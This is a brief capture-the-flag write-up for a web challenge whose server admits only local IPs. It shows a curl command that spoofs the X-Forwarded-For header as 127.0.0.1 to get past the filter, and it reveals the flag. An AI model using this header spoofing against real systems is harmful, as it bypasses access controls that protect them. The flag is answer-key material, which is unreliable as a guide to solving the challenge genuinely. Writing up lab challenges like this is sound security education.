# Got Controls

- Level: easy
- Points: 50
- Category: Web

Upon visiting the website we are greeted with the following message: "Sorry, your IP is not allowed, this server is only accessible from local machine or local LAN."

![Imgur](https://i.imgur.com/jsvOw3c.png)

So there's some kind of IP filtering we have to bypass

# Solution

using the `X-Forwarded-For` header, we can try to impersonate a local IP adress, localhost for example

```bash
#!/bin/bash
curl --verbose --header "X-Forwarded-For: 127.0.0.1" -X GET http://35.197.254.240/gotcontrol/
```

# Flag
The response comes back
`You got me, here's the flag : FLAG{NEVER_TRUST_HEADERS}`
